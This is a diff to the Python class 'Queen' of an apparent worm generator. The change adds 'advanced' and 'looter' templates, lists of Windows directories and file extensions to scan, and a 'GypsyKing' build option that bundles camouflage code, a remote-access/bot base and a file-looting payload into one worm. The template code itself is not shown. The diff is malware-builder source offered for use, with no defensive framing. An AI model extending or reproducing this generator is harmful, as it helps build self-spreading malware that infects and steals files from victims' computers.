@@ -19,7 +19,9 @@ class Queen:
                     "start" : self.loadTemp("startup.py"),
                     "echo" : self.loadTemp("echo.py"),
                     "basic_rat" : self.loadTemp("basicRat.py"),
-                    "basic_bot" : self.loadTemp("basicBot.py")}
+                    "basic_bot" : self.loadTemp("basicBot.py"),
+                    "advanced" : self.loadTemp("advW.py"),
+                    "looter" : self.loadTemp("looter.py")}
         self._emptyConf = {"MULTIPROCESING_FREEZE" : None, "INFECT_WIN" : False}
 
 
@@ -31,6 +33,8 @@ class Queen:
         self.hiveOutDir = os.path.join(self.baseConf.CONF["MAIN_DIR"], "HIVE")
         self.libraryDir = os.path.join(self.baseConf.CONF["APP_DIR"], "library")
         self.ua_file = os.path.join(self.libraryDir, "user_agents.txt")
+        self.GK_dirs = os.path.join(self.libraryDir, "looter_scanWin.txt")
+        self.GK_ext = os.path.join(self.libraryDir, "looter_fileExt.txt")
         if not os.path.exists(self.hiveOutDir):
             os.mkdir(self.hiveOutDir)
 
@@ -93,6 +97,13 @@ class Queen:
                 conf["USER_AGENT"] = self.loadData(self.ua_file)
                 a = self.renderTemplate("basic", conf)
                 b = self.renderTemplate("basic_bot", conf)
+            case "GypsyKing":
+                conf.update({"WORM_NAME": "Looter"})
+                conf.update({"LOOTER_ENV_VARIABLE" : self.loadData(self.GK_dirs), "LOOTER_EXT_FILE": self.loadData(self.GK_ext)})
+                a = self.renderTemplate("basic", conf)
+                b = self.renderTemplate("advanced")
+                c = self.renderTemplate("looter", conf)
+                types += "_looter"
         startup = self.renderTemplate("start", conf)
         fcode = self.chamCode + a + b + c + d + startup
         worm_name = self.saveWorm(name, types, fcode)
